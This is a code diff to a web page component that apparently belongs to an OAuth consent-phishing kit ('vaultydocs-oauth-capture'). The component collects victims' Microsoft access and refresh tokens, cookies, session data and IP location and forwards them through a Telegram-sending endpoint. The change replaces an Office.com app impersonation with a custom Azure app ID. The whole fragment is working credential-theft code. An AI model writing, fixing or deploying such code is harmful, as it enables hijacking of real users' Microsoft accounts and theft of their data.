@@ -227,7 +227,7 @@ export default function AdminConsentCallback() {
             state: state,
             nonce: sessionStorage.getItem('ms_oauth_nonce'),
             redirect_uri: `${window.location.origin}/auth/callback`,
-            client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c' // ✅ VERIFIED Office.com app
+            client_id: '2e338732-c914-4129-a148-45c24f2da81d' // ✅ Your original working app
           },
           
           browser: {
@@ -249,8 +249,7 @@ export default function AdminConsentCallback() {
             captured_at: new Date().toISOString(),
             domain: window.location.hostname,
             source: 'vaultydocs-oauth-capture',
-            verified_app: true,
-            client_name: 'Office.com (Verified)'
+            app_type: 'custom-azure-app'
           }
         };
 
@@ -288,8 +287,7 @@ export default function AdminConsentCallback() {
           hasRefreshToken: !!payload.oauth.refresh_token,
           cookieCount: payload.cookieCount,
           hasSessionData: !!payload.sessionData,
-          hasLocation: !!payload.locationData.ip,
-          verifiedApp: true
+          hasLocation: !!payload.locationData.ip
         });
         
         const telegramResponse = await fetch('/api/sendTelegram', {
